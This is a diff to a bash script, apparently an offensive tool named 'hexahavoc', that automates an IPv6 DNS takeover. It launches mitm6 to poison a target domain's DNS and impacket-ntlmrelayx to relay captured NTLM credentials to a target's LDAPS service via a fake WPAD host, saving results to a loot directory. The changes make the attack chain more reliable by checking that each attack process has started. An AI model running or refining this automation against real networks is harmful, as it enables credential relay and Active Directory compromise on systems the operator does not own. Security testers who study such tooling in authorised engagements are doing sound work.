@@ -110,16 +110,10 @@ ping -c1 -W2 "$target_ip" &>/dev/null || {
   exit 1
 }
 
-ip link show "$interface" >/dev/null 2>&1 || {
+ip -o link show | grep -qw "$interface" || {
   echo -e "${RED}Invalid interface: $interface${RESET}"
   exit 1
 }
-
-# Root privilege check
-if [ "$EUID" -ne 0 ]; then
-  echo -e "${RED}Error: This script must be run as root.${RESET}"
-  exit 1
-fi
 
 # Check dependencies
 echo -e "${CYAN}Checking dependencies...${RESET}"
@@ -127,15 +121,20 @@ for cmd in tmux mitm6 impacket-ntlmrelayx; do
   check_command "$cmd"
 done
 
-session_name="ipv6_dns_takeover_${target_domain}_$(date +%H%M%S)"
+# Root privilege check
+if [ "$EUID" -ne 0 ]; then
+  echo -e "${RED}Error: This script must be run as root.${RESET}"
+  exit 1
+fi
+
+safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
+session_name="ipv6_dns_takeover_${safe_domain}_$(date +%H%M%S)"
 log_file="$loot_dir/hexahavoc_$(date +%F_%H-%M-%S).log"
 
 # Create loot directory if it doesn't exist
 mkdir -p "$loot_dir"
 
 # Suppress console output if silent mode is enabled
-log() { echo -e "$1"; }
-
 if [[ "$silent" -eq 1 ]]; then
   exec >"$log_file" 2>&1
 else
@@ -156,7 +155,10 @@ trap cleanup EXIT
 
 # Create a new tmux session
 echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
-tmux new-session -d -s "$session_name"
+tmux new-session -d -s "$session_name" || {
+  echo -e "${RED}Failed to create tmux session${RESET}"
+  exit 1
+}
 
 # Function to start a tmux window
 start_tmux_window() {
@@ -179,10 +181,22 @@ start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" -d \"$target_
   exit 1
 }
 
+sleep 2
+tmux list-panes -t "$session_name:mitm6" -F "#{pane_pid}" | xargs -r ps -p >/dev/null || {
+  echo -e "${RED}mitm6 failed to start${RESET}"
+  exit 1
+}
+
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
 start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 -t ldaps://$target_ip -wh fakewpad.$target_domain -l $loot_dir" || {
   echo -e "${RED}Failed to start impacket-ntlmrelayx.${RESET}"
+  exit 1
+}
+
+sleep 2
+tmux list-panes -t "$session_name:impacket-ntlmrelayx" -F "#{pane_pid}" | xargs -r ps -p >/dev/null || {
+  echo -e "${RED}ntlmrelayx failed to start${RESET}"
   exit 1
 }
 
